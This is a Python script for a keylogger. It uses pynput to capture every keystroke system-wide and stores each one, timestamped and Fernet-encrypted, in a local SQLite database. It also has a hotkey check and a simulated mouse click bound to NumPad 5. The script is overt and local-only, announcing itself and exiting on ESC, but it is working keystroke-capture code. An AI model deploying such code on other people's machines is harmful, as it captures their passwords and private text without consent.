import sqlite3
from pynput import keyboard, mouse
from datetime import datetime
from cryptography.fernet import Fernet
import os
import subprocess

DB_FILE = "keystrokes.db"
KEY_FILE = "secret.key"


class SecureKeyLogger:
    def __init__(self, combination):
        self.combination = combination
        self.pressed_keys = set()
        self.mouse_controller = mouse.Controller()

        self.conn = sqlite3.connect(DB_FILE)
        self.create_table()

        if not os.path.exists(KEY_FILE):
            self.generate_key()
        self.fernet = Fernet(self.load_key())

        self.listener = keyboard.Listener(
            on_press=self.on_press, on_release=self.on_release
        )

    def create_table(self):
        with self.conn:
            self.conn.execute(
                """
                CREATE TABLE IF NOT EXISTS logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT NOT NULL,
                    key_encrypted TEXT NOT NULL
                )
            """
            )

    def generate_key(self):
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as f:
            f.write(key)

    def load_key(self):
        with open(KEY_FILE, "rb") as f:
            return f.read()

    def encrypt_log(self, key_str):
        timestamp = datetime.utcnow().isoformat()
        entry = f"{timestamp} {key_str}"
        encrypted = self.fernet.encrypt(entry.encode()).decode()
        with self.conn:
            self.conn.execute(
                "INSERT INTO logs (timestamp, key_encrypted) VALUES (?, ?)",
                (timestamp, encrypted),
            )

    def get_key_str(self, key):
        if hasattr(key, "char") and key.char:
            return key.char
        elif hasattr(key, "name"):
            return f"[{key.name}]"
        else:
            return str(key)

    def num_lock_enabled(self):
        try:
            output = subprocess.check_output(["xset", "q"]).decode()
            return "Num Lock:   on" in output
        except Exception as e:
            print(f"[!] Could not detect Num Lock: {e}")
            return True

    def simulate_mouse_click(self):
        print("Simulating mouse click")
        self.mouse_controller.click(mouse.Button.left, 1)

    def on_press(self, key):
        self.pressed_keys.add(key)
        key_str = self.get_key_str(key)
        self.encrypt_log(key_str)

        if self.combination.issubset(self.pressed_keys):
            print("Detected Ctrl + Alt + K!")

        if key == keyboard.KeyCode.from_vk(12):  # NumPad 5 (Linux)
            if not self.num_lock_enabled():
                self.simulate_mouse_click()

    def on_release(self, key):
        if key in self.pressed_keys:
            self.pressed_keys.remove(key)
        if key == keyboard.Key.esc:
            print("Exiting keylogger.")
            self.conn.close()
            self.listener.stop()

    def start(self):
        print("Keylogger active. Press ESC to exit.")
        self.listener.start()
        self.listener.join()


if __name__ == "__main__":
    combo = {keyboard.Key.ctrl_l, keyboard.Key.alt_l, keyboard.KeyCode(char="k")}
    logger = SecureKeyLogger(combination=combo)
    logger.start()
